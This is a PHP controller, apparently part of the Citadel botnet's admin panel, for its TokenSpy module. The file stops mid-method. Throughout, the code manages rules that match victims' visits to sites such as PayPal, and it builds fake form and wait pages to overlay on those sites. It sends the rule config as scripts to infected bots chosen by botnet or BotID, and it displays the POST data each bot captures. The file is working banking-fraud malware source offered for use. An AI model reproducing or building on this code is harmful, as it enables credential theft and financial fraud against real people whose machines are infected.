<?php
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/amiss/amiss.php';

require_once 'system/lib/guiutil.php';

require_once 'system/lib/fun/TokenSpy/TsState.php';
require_once 'system/lib/fun/TokenSpy/gate/BotInfo.php';
require_once 'system/lib/fun/TokenSpy/resources/Template.php';
require_once 'system/lib/fun/TokenSpy/resources/Page.php';
require_once 'system/lib/fun/TokenSpy/resources/Skeleton.php';

use lib\fun\TokenSpy;
use Citadel\Models;

class botnet_tokenspyController {
    function __construct(){
        $this->db = dbPDO::singleton();
        $this->amiss = Amiss::singleton();
        $this->state = new TokenSpy\TsState;
    }

    #region Setup

    /** PAGE: index page
     */
    function actionIndex(){
        $man = $this->amiss->man;

        # Checks
        if (!is_writable(TokenSpy\TsState::PATH))
            flashmsg('err', LNG_FLASHMSG_MUST_BE_WRITABLE, array(':name' => TokenSpy\TsState::PATH));

        nodejs_test_connection(true);

        ThemeBegin(LNG_MM_BOTNET_TOKENSPY, 0, getBotJsMenu('botmenu'), 0);

        # Data
        $data = new stdClass;

        # Data: TsRulesCtrl
        $ctrl = $data->TsRulesCtrl = new stdClass;
        $ctrl->rules = new stdClass;
        foreach ($man->getList('Citadel\Models\TokenSpy\Rule') as $rule){ /** @var Models\TokenSpy\Rule $rule */
            $ctrl->rules->{$rule->id} = $rule;
            if ($rule->template[0] == '.')
                $rule->template = '--custom--'; // will change this on save
        }

        $ctrl->availableTemplates = array_combine($templates = TokenSpy\Template::listObjectNames(), $templates);
        $ctrl->availableTemplates['--custom--'] = '-- Custom --';

        # Data: TsRulesScriptCtrl
        $ctrl = $data->TsRulesScriptCtrl = new stdClass;
        $ctrl->availableBotnets = $this->db->query('SELECT DISTINCT `botnet` FROM `botnet_list` ORDER BY `botnet` ASC;')->fetchAll(PDO::FETCH_COLUMN);
        $ctrl->botnets = $ctrl->availableBotnets? array_combine($ctrl->availableBotnets, array_fill(0, count($ctrl->availableBotnets), false)): array();

        $ctrl->script = $this->actionCrudBotscript();
        foreach ($ctrl->script->botnets_wl as $botnet)
            $ctrl->botnets[$botnet] = true;

        $ctrl->script_loads = (object)array('sent' => 0, 'ok' => 0, 'err' => 0, 'dt_first' => '?', 'dt_last' => '?');
        if ($ctrl->script->id)
            $ctrl->script_loads = $this->db->query(
                'SELECT
                    COALESCE(SUM(`bss`.`type`=1), 0) AS `sent`,
                    COALESCE(SUM(`bss`.`type`=2), 0) AS `ok`,
                    COALESCE(SUM(`bss`.`type`=3), 0) AS `err`,
                    COALESCE(FROM_UNIXTIME(MIN(`bss`.`rtime`)), "?") AS `dt_first`,
                    COALESCE(FROM_UNIXTIME(MAX(`bss`.`rtime`)), "?") AS `dt_last`
                 FROM `botnet_scripts` `bs`
                    CROSS JOIN `botnet_scripts_stat` `bss` USING(`extern_id`)
                 WHERE `bs`.`id`=:id
                 ;', array(
                ':id' => $ctrl->script->id,
            ))->fetchObject();

        $max_rule_mtime = 0;
        foreach ($data->TsRulesCtrl->rules as $Rule) /** @var Models\TokenSpy\Rule $Rule */
            $max_rule_mtime = max($max_rule_mtime, $Rule->mtime->format('U'));
        $ctrl->needsUpdate = $ctrl->script->time_created? ($ctrl->script->time_created->format('U') < $max_rule_mtime) : true;

        # Data: TsServiceCtrl
        $ctrl = $data->TsServiceCtrl = new stdClass;
        $ctrl->rules = $data->TsRulesCtrl->rules; // same data: all rules

        # Data
        unset($data->TsRulesScriptCtrl->script->extern_id); // json_encode() fails on invalid unicode sequences
        echo jsonset(array(
            'window.data' => new stdClass,
            'window.data.tokenspy' => new stdClass,
            'window.data.tokenspy.index' => $data,
        ));

        # HTML
        echo <<<HTML
        <div id="ts-index" class="ng-cloak">

            <div id="ts-launch-button">
                <a href="?m=botnet_tokenspy/ts" target="_blank" class="btn btn-large btn-warning">Launch TokenSpy</a>
            </div>

            <div id="ts-index-rules" ng-controller="TsRulesCtrl">

                <table id="ts-index-rules" class="table table-striped table-bordered table-condensed">
                    <caption>
                        Rules
                        <a href="#" class="pull-left" ng-click="editRule.init();" eat-event><i class="icon-plus-sign"></i> New Rule</a>
                    </caption>
                    <THEAD><tr>
                        <th width=32>On?</th>
                        <th>Name</th>
                        <th>Proxy Masks</th>
                        <th>Template</th>
                        <th>Page</th>
                    </tr></THEAD>
                    <TBODY context-menu="cMenu.rule">
                        <tr ng-repeat="rule in rules | orderBy:mtime:reverse" data-id="{{rule.id}}">
                            <td><input type="checkbox" ng-model="rule.enabled" ng-true-value="1" ng-false-value="0" ng-change="ajaxRule(rule.id, rule);" /></td>
                            <th>
                                <a href="#" ng-click="editRule.init(rule.id);" eat-event>{{ rule.name }}</a>
                                <div ng-show="rule.bots_wl && rule.bots_wl.length>0">Limited to {{rule.bots_wl.length}} bots</div>
                            </th>
                            <td><ol>
                                <li ng-repeat="p in rule.pmasks">{{p}}</li>
                            </ol></td>
                            <td>{{ rule.template }}</td>
                            <td>{{ rule.page.name }}: {{ rule.page.title }}</td>
                        </tr>
                    </TBODY>
                </table>

                <div id="ts-index-rule-edit" class="modal fade hide">
                    <form class="form-horizontal form-condensed">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">✕</button>
                            <h3>Rule</h3>
                        </div>
                        <div class="modal-body">
                            <div class="control-group">
                                <label class="control-label">Name</label>
                                <div class="controls">
                                    <input type=text class="input-xxlarge" ng-model="editRule.rule.name" required />
                                    <div class="help-block">Rule name</div>
                                </div>
                            </div>
                            <div class="control-group">
                                <label class="control-label">Template</label>
                                <div class="controls">
                                    <select ng-model="editRule.rule.template" ng-options="value as title for (value, title) in availableTemplates" required></select>
                                    <a href="#" ng-show="editRule.rule.template == '--custom--'" ng-click="editRule.editTemplate()" eat-event>Edit custom template</a>

                                    <div class="help-block">The template to use once the Rule has matched</div>
                                </div>
                            </div>
                            <div class="control-group">
                                <label class="control-label">Page</label>
                                <div class="controls">
                                    <a href="#" ng-click="editRule.editPage()" eat-event>{{editRule.rule.page && editRule.rule.page.title || 'Create'}}</a>
                                    <div class="help-block">Initial page to use once the Rule has matched</div>
                                </div>
                            </div>
                            <div class="control-group   pmasks">
                                <label class="control-label">Proxy Masks</label>
                                <div class="controls">
                                    <textarea class="input-xxlarge" rows="{{editRule.rule.pmasks.length+1}}" ng-model="editRule.rule.pmasks" ng-list-ex="'\n'"></textarea>
                                    <div class="help-block">
                                        When the Rule is activated - URLs matching these masks get covered with TokenSpy.
                                        <p>Masks, one per line. Example: <code>http?://*.paypal.com/*</code>
                                    </div>
                                </div>
                            </div>
                            <div class="control-group   patterns">
                                <label class="control-label">Triggers<a href="#" ng-click="editRule.addPattern();" eat-event><i class="icon-plus-sign"></i></a></label>
                                <div class="controls">
                                    <div class="help-block">If any of these trigger patterns match — the whole Rule matches</div>

                                    <ol>
                                        <li ng-repeat="pattern in editRule.rule.patterns">
                                            <div class="pull-left">#{{pattern.uid}}</div>
                                            <a href="#" class="pull-right" title="Remove pattern" ng-click="editRule.removePattern(\$index);" eat-event><i class="icon-minus-sign"></i></a>
                                            <div class="control-group">
                                                <label class="control-label">Mask</label>
                                                <div class="controls">
                                                    <input type=text class="input-xxlarge" ng-model="pattern.mask" required />
                                                    <div class="help-block">URL mask. Example: <code>http?://www.paypal.com/*/webscr?cmd=p/gen/about*</code></div>
                                                </div>
                                            </div>
                                            <div class="control-group">
                                                <label class="control-label">POST fields</label>
                                                <div class="controls">
                                                    <textarea class="input-xxlarge" rows="{{pattern.post.length+1}}" ng-model="pattern.post" ng-list-ex="'\n'"></textarea>
                                                    <div class="help-block">POST fields masks, one per line. Example: <code>login=*</code></div>
                                                </div>
                                            </div>
                                        </li>
                                    </ol>
                                </div>
                            </div>
                            <div class="control-group">
                                <label class="control-label">Bots</label>
                                <div class="controls">
                                    <textarea class="input-xxlarge" rows="{{editRule.rule.bots_wl.length+1}}" ng-model="editRule.rule.bots_wl" ng-list-ex="'\n'"></textarea>
                                    <div class="help-block">
                                        White list of bots allowed to trigger this rule. When empty - the rule is available to everybody.
                                        <p>BotIDs, one per line. Example: <code>WINXP-6541AFC6AE</code>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <a href="#" class="btn btn-primary" ng-click="editRule.save();"  eat-event>{{editRule.rule.id && 'Save' || 'Add'}}</a>
                        </div>
                    </form>
                </div>
            </div>

            <div id="ts-index-rules-submit" ng-controller="TsRulesScriptCtrl">

                <form class="form-horizontal form-condensed">
                    <legend>Submit Rules</legend>

                    <div ng-show="needsUpdate" class="alert alert-danger">Rules script needs to be updated</div>

                    <div class="help-block">The above rules will only be applied to bots once you submit them. A script is created for that.</div>

                    <dl id="script_loads" class="alert alert-info pull-right">
                        <dt><a href="?m=botnet_scripts&view={{script.id}}" target="_blank">Script</a> stat</dt>
                            <dd>Sent = {{script_loads.sent}}, OK = {{script_loads.ok}}, Errors = {{script_loads.err}}</dd>
                        <dt>Dates</dt>
                            <dd>{{script_loads.dt_first}} – {{script_loads.dt_last}}</dd>
                    </dl>

                    <div class="control-group">
                        <div class="control-label">
                            <label>Botnets</label>
                        </div>
                        <div class="controls">
                            <ul class="inline">
                                <li><a href="#" ng-click="botnetsAll()" eat-event>All</a></li>
                                <li><a href="#" ng-click="botnetsNone()" eat-event>None</a></li>
                            </ul>
                        </div>
                        <div class="controls">
                            <label class="checkbox" ng-repeat="(botnet,enabled) in botnets"><input type="checkbox" ng-model="botnets[botnet]" /> {{botnet}}</label>
                        </div>
                    </div>

                    <div class="control-group">
                        <div class="controls">
                            <a href="#" class="btn btn-primary" ng-click="crudBotscript(script)" eat-event>Update rules</a>
                            <a href="#tempscript-modal" class="btn btn-success" data-toggle="modal">Test on..</a>

                            <div ng-show="crudBotscript.ok" class="alert alert-success">
                                Script updated: <a href="?m=botnet_scripts&view={{script.id}}" target="_blank">{{script.name}}</a>
                            </div>

                            <div ng-show="crudBotscriptTemp.ok" class="alert alert-success">
                                Temp script updated: <a href="?m=botnet_scripts&view={{tscript.id}}" target="_blank">{{tscript.name}}</a>
                            </div>

                            <div ng-show="crudBotscript.error" class="alert alert-error">
                                Script save error:
                                <pre>{{crudBotscript.error}}</pre>
                            </div>
                        </div>
                    </div>

                </form>


                <div class="modal fade hide" id="tempscript-modal">
                    <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">✕</button>
                            <h3>Test TokenSpy rules on these</h3>
                        </div>
                    <div class="modal-body">
                        <form class="form-horizontal form-condensed">
                            <div class="control-group">
                                <label class="control-label">BotIDs</label>
                                <div class="controls">
                                    <textarea class="input input-xlarge" rows="{{tscript.bots_wl.length+2}}" ng-model="tscript.bots_wl" ng-list-ex="'\n'"></textarea>
                                    <div class="help-block">Provide a list of BotIDs to load the script for</div>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <a href="#" class="btn btn-primary" data-dismiss="modal" ng-click="crudBotscriptTemp(tscript)" eat-event>Save</a>
                    </div>
                </div>
            </div>


            <div id="ts-index-service" ng-controller="TsServiceCtrl">
                <form class="form-horizontal form-condensed">
                    <legend>Service</legend>

                    <div class="btn-toolbar">
                        <div class="btn-group">
                            <button class="btn btn-default dropdown-toggle" data-toggle="dropdown">Test rule <span class="caret"></span></button>
                                <ul class="dropdown-menu">
                                    <li ng-repeat="rule in rules | orderBy:mtime:reverse"><a href="#" ng-click="testRule(rule)" eat-event>{{ rule.name }}</a></li>
                                </ul>
                        </div>
                        <div class="btn-group">
                            <button class="btn btn-danger dropdown-toggle" data-toggle="dropdown">Reset <span class="caret"></span></button>
                                <ul class="dropdown-menu">
                                    <li><a href="#ts-reset-confirm" data-toggle="modal">Reset bots</a></li>
                                </ul>
                        </div>
                    </div>
                </form>


                <div class="modal fade hide" id="ts-reset-confirm">
                    <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">✕</button>
                            <h3>Reset TokenSpy?</h3>
                        </div>
                    <div class="modal-body">
                        <p>This action will remove all TokenSpy materials: the list of active bots, ignore- and ban-lists, statistics and POST data.
                        <p>Don't worry, no rules, pages or bots are removed.
                    </div>
                    <div class="modal-footer">
                        <a href="#" class="btn btn-danger" ng-click="tsResetState()" eat-event>Reset</a>
                    </div>
                </div>
            </div>

        </div>

        <script type="text/javascript" data-main="theme/js/page-botnet_tokenspy-index.js"  src="theme/js/require/require-min.js"></script>
        <script type="text/javascript" src="theme/js/requirejs-config.js"></script>

        <!-- preload resources -->
        <div id="tokenspy-app-loading"></div>
HTML;

        ThemeEnd();
    }

    /** AJAX: Rule CRUD
     */
    function actionCrudRule($id=null, $data=null, $del=false){
        # "null" fixes (wtf)
        foreach (array('page', 'skeleton', 'bots_wl') as $name)
            if (isset($data[$name]) && is_string($data[$name]) && $data[$name] === 'null')
                $data[$name] = null;

        # Make Page
        if (!empty($data['page']) && is_array($data['page']))
            $data['page'] = $this->_PageFromPost($data['page']);

        # Assign uids to patterns
        if (!empty($data['patterns'])){
            $uid = 0;
            foreach ($data['patterns'] as &$pattern)
                $pattern['uid'] = $uid++;
        } else
            $data['patterns'] = array(); # empty arrays don't play well with urlencoded forms

        # Skeleton
        if (!empty($data['template']) && $data['template'] != '--custom--')
            $data['skeleton'] = null;

        if (!empty($data['skeleton'])){
            $Skeleton = new TokenSpy\Skeleton($data['skeleton']['name']);
            $Skeleton->values = $data['skeleton']['values'];
            $Skeleton->render();
            $data['skeleton'] = $Skeleton;
        }

        # CRUD
        $Rule = $this->amiss->crudHelper( /** @var Models\TokenSpy\Rule $Rule */
            '\Citadel\Models\TokenSpy\Rule',
            $id, $data, $del
        );

        # Save Skeleton as template
        if (!empty($data) && !empty($Rule->skeleton)){
            $Rule->template = $Rule->skeleton->saveForRule($Rule);
            $this->amiss->man->save($Rule); // update template name

            // however, our outer script wants '--custom--'
            $Rule->template = '--custom--';
        }

        return $Rule;
    }

    /** AJAX: BotScript CRUD
     */
    function actionCrudBotscript($data=null, $del=false, $temp=false){
        # Always work with an existing id as the script is a singleton (permanent scripts)
        $id = null;
        if (!$temp)
            $id = $this->db->query(
                'SELECT `id`
                 FROM `botnet_scripts`
                 WHERE `name` = :name
                 ;', array(
                ':name' => 'tokenspy-config'
            ))->fetchColumn();
        if (!$id)
            $id = null;

        # CRUD
        if (!empty($data)){
            $jsonFilename = $temp? 'tokenspy-config-temp.json' : 'tokenspy-config.json';
            $script = "tokenspy_update {$jsonFilename}";
            $scriptName = $temp? 'auto:tokenspy-config-temp' : 'tokenspy-config'; // always use the same name

            $data = array(
                'id' => $id,
                'name' => $scriptName,
                'extern_id' => Models\BotScript::gen_extern_id($scriptName), # always
                'flag_enabled' => 1,
                'time_created' => new \DateTime,
                'send_limit' => '',
                'script_text' => $script,
                'script_bin' => $script,
            ) + (array)$data + array(
                # Provide defaults for the arrays
                'bots_wl' => array(),
                'bots_bl' => array(),
                'botnets_wl' => array(),
                'botnets_bl' => array(),
                'countries_wl' => array(),
                'countries_bl' => array(),
            );

            # Update the config JSON
            $this->_updateTokenspyConfigFile("files/{$jsonFilename}");

            # Remove script reports
            $this->db->query(
                'DELETE `botnet_scripts_stat`
                 FROM `botnet_scripts`
                    CROSS JOIN `botnet_scripts_stat` USING(`extern_id`)
                 WHERE `botnet_scripts`.`id`=:id
                 ;', array(
                ':id' => $id
            ));
        }

        $script = $this->amiss->crudHelper(
            '\Citadel\Models\BotScript',
            $id, $data, $del
        );
        unset($script->extern_id);
        return $script;
    }

    /** Update the rules file
     */
    protected function _updateTokenspyConfigFile($config_filename = 'files/tokenspy-config.json'){
        # Prepare the data
        $ts = $GLOBALS['config']['tokenspy']['ts.php'];
        $config = (object)array(
            'SUrl' => "{$ts}/.ts/getState",
            'FUrl' => "{$ts}/.ts/enter",
            'RUrl' => "{$ts}/",
            'Rules' => array(),
        );

        # Collect
        $rules = $this->amiss->man->getList('Citadel\Models\TokenSpy\Rule', 'enabled=?', 1);
        foreach ($rules as $rule) /** @var Models\TokenSpy\Rule $rule */
            $config->Rules[] = (object)array(
                'uid' => $rule->name,
                'patterns' => $rule->patterns,
                'pmasks' => $rule->pmasks,
            );

        # Write
        $config_json = json_encode($config);
        return file_put_contents($config_filename, $config_json);
    }

    /** AJAX: Reset TS state
     */
    function actionTsResetState(){
        // Cleanup bots state
        $this->db->query('DELETE FROM `tokenspy_bots_history`;');
        $this->db->query('DELETE FROM `tokenspy_bots_posted`;');
        $this->db->query('DELETE FROM `tokenspy_bots_state`;');

        // Remove the script
        $this->actionCrudBotscript(null, true);
        return true;
    }

    /** AJAX: Launch the page editor
     * A page can belong to a Rule (::page), BotState (::page, ::page2), BotHistoryLine (::page), PagePreset (::page)
     * @param string $class
     *      The owner class name: 'Rule', 'BotState', 'BotHistoryLine', 'PagePreset'
     * @param string $prop
     *      The property the page is located in
     * @param int $id
     *      PK of the owner object
     * @param array $page
     *      The page data to save
     * @param bool $controlled
     *      Whether the page is launched in a "controlled" state and does not edit an existing entity.
     *      In this mode, Angular is not bootstrapped unless the $(window).trigger('bootstrap') is made
     * @param bool $hotPresets
     *      Shortcut mode: open presets picker and apply immediately
     * @throws \Exception
     */
    function actionAjaxEditPage($class, $prop, $id, $page = null, $controlled = false, $hotPresets = false){
        $man = $this->amiss->man;

        # Get the class
        $className = "\\Citadel\\Models\\TokenSpy\\{$class}";
        if (!class_exists($className, false))
            throw new \Exception("Class not found: '{$className}'");

        # Check the property
        if (!property_exists($className, $prop))
            throw new \Exception("Property not found: '{$className}::{$prop}'");

        # Get the object
        if (!$controlled){
            $obj = $man->getByPk($className, $id);
            if (!$obj)
                throw new \Exception("Object not found: '{$className}' PK={$id}");
        } else
            $obj = new $className; # dummy object for the lulz

        # SAVE
        if (!is_null($page)){
            $obj->$prop = $this->_PageFromPost($page);
            if ($obj instanceof Models\TokenSpy\BotState)
                $obj->mtime = new \DateTime;
            if (!$controlled)
                $man->save($obj);

            header('Content-Type: application/json');
            echo json_encode(array('ok' => true));
            return;
        }

        # Get the entity title
        if (!$id)
            $entityTitle = 'New page';
        elseif ($obj instanceof Models\TokenSpy\Rule)
            $entityTitle = $obj->name;
        elseif ($obj instanceof Models\TokenSpy\BotState)
            $entityTitle = $obj->botId;
        elseif ($obj instanceof Models\TokenSpy\BotHistoryLine)
            $entityTitle = $obj->botId;
        elseif ($obj instanceof Models\TokenSpy\PagePreset)
            $entityTitle = $obj->name;
        else
            $entityTitle = '??';

        # List the available page presets
        $pagePresets = $this->db->query('SELECT `id`, `name` FROM `tokenspy_page_presets` ORDER BY `name` ASC;')->fetchAll(\PDO::FETCH_KEY_PAIR);

        # Get the page
        $page = $obj->{$prop};

        # Export it
        echo jsonset(array(
            'window.data' => new stdClass,
            'window.data.tokenspy' => new stdClass,
            'window.data.tokenspy.editpage' => new stdClass,
            'window.data.tokenspy.editpage.pagePresets' => $pagePresets,
            'window.data.tokenspy.editpage.availableTemplates' => TokenSpy\Template::listObjectNames(),
            'window.data.tokenspy.editpage.entityTitle' => $entityTitle,
            'window.data.tokenspy.editpage.prop' => $prop,
            'window.data.tokenspy.editpage.class' => $class,
            'window.data.tokenspy.editpage.page' => $page,
            'window.data.tokenspy.editpage.controlled' => (bool)$controlled,
            'window.data.tokenspy.editpage.hotPresets' => (bool)$hotPresets,
        ));

        # Echo some HTML
        $pageAdminHtml = array(
            'form'      => file_get_contents('system/resources/TokenSpy/pages/form/pageAdmin.htm'),
            'static'    => file_get_contents('system/resources/TokenSpy/pages/static/pageAdmin.htm'),
            'wait'      => file_get_contents('system/resources/TokenSpy/pages/wait/pageAdmin.htm'),
            'form-wait' => file_get_contents('system/resources/TokenSpy/pages/form-wait/pageAdmin.htm'),
        );
        $pageAdminHtml['form-wait'] = str_replace(
            array(
                '{{form/pageAdmin.htm}}',
                '{{wait/pageAdmin.htm}}'
            ),
            array(
                $pageAdminHtml['form'],
                $pageAdminHtml['wait']
            ),
            $pageAdminHtml['form-wait']
        );

        echo <<<HTML
<style>
.ng-cloak {display: none;}
form input[type='number']{ padding: 0px; margin: 0px;}
</style>
<div id="tokenspy-pageadmin" --ng-app="editpage">
    <img src="theme/images/ajax-spinner.gif" ng-hide="1" />

    <form
        action="?m=botnet_tokenspy/ajaxEditPage&class={$class}&prop={$prop}&id={$id}" method=POST
        ng-submit="ajaxSavePage(page);" eat-event="submit"
        ng-controller="TsPageAdminCtrl"
        class="form-horizontal ng-cloak">

    <h3>{{entityTitle}} ({{class}}::{{prop}})</h3>

    <!-- Page presets UI -->
    <div class="btn-toolbar pull-right">
        <div class="btn-group">
            <a class="btn" href="#ts-editpage-pick-preset" title="Pick a preset"  role="button" data-toggle="modal" ng-show="pagePresets"><i class="icon-hand-up"></i></a>
            <a class="btn" href="#ts-editpage-save-preset" title="Save as preset" role="button" data-toggle="modal" ng-show="page.name"><i class="icon-briefcase"></i></a>
        </div>

        <div class="modal hide fade" id="ts-editpage-pick-preset">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                <h3>Pick a Page Preset</h3>
            </div>
            <div class="modal-body">
                <div class="control-group">
                    <label class="radio" ng-repeat="(id, name) in pagePresets">
                        <input type="radio" value="{{id}}" ng-model="pagePreset.id" /> {{name}}
                        <a href="#" ng-click="ajaxPageDeletePreset(\$event, id);"><i class="icon-remove"></i></a>
                    </label>
                </div>
            </div>
            <div class="modal-footer">
                <a href="#" class="btn btn-primary" ng-click="ajaxPagePickPreset(\$event);">Use</a>
            </div>
        </div>

        <div class="modal hide fade" id="ts-editpage-save-preset">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                <h3>Save as Page Preset</h3>
            </div>
            <div class="modal-body">
                <label class="control-label">Preset name</label>
                <div class="control-group">
                    <input type="text" class="input-xxlarge" ng-model="pagePreset.name" />
                </div>
            </div>
            <div class="modal-footer">
                <a href="#" class="btn btn-primary" ng-click="ajaxPageSavePreset(\$event);">{{pagePreset.id && 'Save' || 'Add'}}</a>
            </div>
        </div>
    </div>

    <fieldset>
        <legend>Page settings</legend>

        <div class="control-group">
            <label class="control-label">Page type</label>
            <div class="controls ">
                <label class="radio inline"><input type="radio" ng-model="page.name" name="page[name]" value="static" /> Static</label>
                <label class="radio inline"><input type="radio" ng-model="page.name" name="page[name]" value="wait" /> Wait</label>
                <label class="radio inline"><input type="radio" ng-model="page.name" name="page[name]" value="form" /> Form</label>
                <label class="radio inline"><input type="radio" ng-model="page.name" name="page[name]" value="form-wait" /> Form-Wait</label>
                <span class="help-block">Defines its look & behavior</span>
            </div>
        </div>

        <div class="control-group">
            <label class="control-label">Page title</label>
            <div class="controls">
                <input type="text" ng-model="page.title" name="page[title]" class="input-xxlarge" />
            </div>
        </div>

        <div class="control-group">
            <label class="control-label">Timeout</label>
            <div class="controls">
                <input type="number" ng-model="page.timeout" name="page[timeout]" min="0" class="input-small" />
                <span class="add-on">sec</span>
            </div>

            <span class="help-block">The number of seconds before an automatic page transition. Also powers the progressbar on the "wait" page type.</span>
        </div>
    </fieldset>

    <ng-switch on="page.name">
        <div ng-switch-when="static">{$pageAdminHtml['static']}</div>
        <div ng-switch-when="wait">{$pageAdminHtml['wait']}</div>
        <div ng-switch-when="form">{$pageAdminHtml['form']}</div>
        <div ng-switch-when="form-wait">{$pageAdminHtml['form-wait']}</div>
    </ng-switch>

    <div class="form-actions">
        <div class="btn-group dropup">
            <a class="btn dropdown-toggle" data-toggle="dropdown" href="#">Preview <span class="caret"></span></a>
            <ul class="dropdown-menu">
                <li ng-repeat="template in availableTemplates"><a href="?m=botnet_tokenspy/ajaxPagePreview&template={{template}}" target="_blank" ng-click="ajaxPagePreview(\$event);">{{template}}</a></li>
                <li ng-show="skeleton"><a href="?m=botnet_tokenspy/ajaxPagePreview" target="_blank" ng-click="ajaxPagePreview(\$event, true);">-- Custom --</a></li>
            </ul>
        </div>

        <button type="submit" class="btn btn-primary" data-loading-text="Saving...">Save</button>

        <div ng-show="ajaxSavePage.ok" class="alert alert-success">
            Page saved ok
        </div>

        <div ng-show="ajaxSavePage.error" class="alert alert-error">
            Page save error:
            <pre>{{ajaxSavePage.error}}</pre>
        </div>
    </div>

    </form>
</div>

<script type="text/javascript" data-main="theme/js/page-botnet_tokenspy-editpage.js"  src="theme/js/require/require-min.js"></script>
<script type="text/javascript" src="theme/js/requirejs-config.js"></script>
HTML;

    }

    /** Instantiate TokenSpy\Page from the POSTed array
     * @param array $page
     * @return TokenSpy\Page
     */
    protected function _PageFromPost($page){
        $page += array(
            'title' => '',
            'timeout' => null,
            'data' => array(),
        );

        $Page = new TokenSpy\Page($page['name']);
        $Page->title = $page['title'];
        $Page->timeout = (int)$page['timeout'];
        $Page->data = $page['data'];
        return $Page;
    }

    /** AJAX: Page preset CRUD
     * @param int|null $id
     *      Id (to overwrite)
     * @param string $name
     *      Preset name
     * @param array $page
     *      The page (to save)
     * @throws \Exception
     */
    function actionAjaxPagePreset($id=null, $name=null, $page=null, $delete = false){
        $man = $this->amiss->man;
        $className = '\Citadel\Models\TokenSpy\PagePreset';

        # Delete?
        if ($delete)
            return $man->deleteByPk($className, $id);

        # Create | Load
        if ($id)
            $Preset = $man->getByPk($className, $id);
        else
            $Preset = new Models\TokenSpy\PagePreset;
        if (!$Preset)
            throw new \Exception('Preset not found by id');

        # Save?
        if (!empty($name) && !empty($page)){
            $Page = $page? $this->_PageFromPost($page) : null;
            $Preset->name = $name;
            $Preset->page = $Page;
            $man->save($Preset);
        }

        return $Preset;
    }

    /** AJAX: Page preview
     * @param string|null $template
     *      The name of the template to use
     * @param array|null $page
     *      Page POSTed directly from the form.
     *      `null` to use Lorem Ipsum
     * @param array|null $skeleton
     *      The skeleton data to use for preview
     */
    function actionAjaxPagePreview($template = null, $page = null, $skeleton = null){
        # BotInfo
        $botInfo = TokenSpy\gate\BotInfo::makeTestBotInfo('http://example.com/');

        # Start a dummy session
        session_write_close();
        $botInfo->session_start();

        # Skeleton
        if (!empty($skeleton)){
            $skeleton = json_decode($skeleton, JSON_OBJECT_AS_ARRAY);
            $Skeleton = new TokenSpy\Skeleton($skeleton['name']);
            $Skeleton->values = $skeleton['values'];
            $Skeleton->render()->saveAs($template = '.preview');
        }

        # Template
        $Template = new TokenSpy\Template($template);

        # Page
        if (!is_null($page))
            $Page = $this->_PageFromPost($page);
        else
            $Page = TokenSpy\Page::makeTestStaticPage();

        # BotState
        $botState = Models\TokenSpy\BotState::makeTestBotState($template, $Page);

        # Render
        echo $Template->render($Page, array(
            'botState' => $botState,
            'botInfo' => $botInfo,
        ));
    }


    /** AJAX: Launch the template editor
     * @throws \Exception
     */
    function actionAjaxEditTemplate(){
        $man = $this->amiss->man;

        # Export data
        echo jsonset(array(
            'window.data' => new stdClass,
            'window.data.tokenspy' => new stdClass,
            'window.data.tokenspy.edittpl' => new stdClass,
            'window.data.tokenspy.edittpl.availableSkeletons' => TokenSpy\Skeleton::listObjectNames(),
        ));

        # HTML
        echo <<<HTML
<div id="tokenspy-edittpl" --ng-app="edittpl">
    <img src="theme/images/ajax-spinner.gif" ng-hide="1" />

    <form
        ng-submit="ajaxSaveTemplate(page);" eat-event="submit"
        ng-controller="TsEditTplCtrl"
        class="form-horizontal ng-cloak">

    <h3>Custom Template</h3>

    <fieldset>
        <div class="control-group">
            <label class="control-label">Skeleton</label>
            <div class="controls">
                <select ng-model="skeleton.name" ng-options="v for v in availableSkeletons" required></select>
                <div class="help-block">The skeleton to create the custom template from</div>
            </div>
        </div>
    </fieldset>

    <fieldset class="form-condensed" ng-include src="skeleton.url" onload="onSkeletonLoad();"></fieldset>

    <div class="form-actions" ng-show="skeleton.name">
        <a class="btn" href="#" ng-click="actions.preview();" eat-event>Preview</a>
        <a class="btn btn-primary" ng-click="actions.save();" eat-event>Save</a>
    </div>

    </form>
</div>

<!--<script type="text/javascript" data-main="theme/js/page-botnet_tokenspy-edittpl.js"  src="theme/js/require/require-min.js"></script>-->
<!--<script type="text/javascript" src="theme/js/requirejs-config.js"></script>-->
HTML;

    }

    /** AJAX: Load skeleton partial
     * @throws \Exception
     */
    function actionAjaxLoadSkeletonPartial($skeleton){
        $Skeleton = new TokenSpy\Skeleton($skeleton);
        echo $Skeleton->getForm('skeleton.values');
        echo jsonset(array(
            'window.data.tokenspy.edittpl.skeletonDefaultValues' => $Skeleton->getDefaultValues(),
        ));
    }

    #endregion



    #region Interactive
    /** AJAX: Set the TokenSpy state
     * @param string $do
     */
    function actionAjaxTsState($do = null){
        $this->state->load();
        switch ($do){
            case 'on':
                $this->state->ts_enabled(true);
                break;
            case 'off':
                $this->state->ts_enabled(false);
                break;
            case 'pause':
                $this->state->ts_enabled(true);
                $this->state->ts_paused(true);
                break;
        }
        if ($do)
            $this->state->save();

        # Finish
        header('Content-Type: application/x-json');
        echo json_encode(array(
            'enabled' => $this->state->ts_enabled(),
            'paused' => $this->state->ts_paused(),
        ));
    }

    /** AJAX: Load the recent bot POST data
     * @param string $botId
     */
    function actionAjaxBotPosted($botId){
        $man = $this->amiss->man;
        $posts = $man->getList('\Citadel\Models\TokenSpy\BotPosted', array('order'=>'{id} DESC', 'where' => 'botId = ?', 'params' => array($botId))); /** @var \Citadel\Models\TokenSpy\BotPosted[] $posts */

        if ($posts)
            foreach ($posts as $post){
                echo '<table class="table table-striped table-bordered table-condensed" id="bot-post-log">',
                    '<caption>', $post->ctime->format('Y-m-d H:i:s'), '</caption>';
                foreach ($post->data as $key => $value)
                    echo '<tr>',
                        '<th>', htmlspecialchars($key), '</th>',
                        '<td>', htmlspecialchars(is_scalar($value)? $value : json_encode($value)), '</td>',
                        '</tr>';
                echo '</table>';
            }
    }

    /** The number of history pages to hide under ellipsis
     */
    const LOG_ITEMS_ELLIPSIS = 4;

    /** AJAX: Load the bots' state
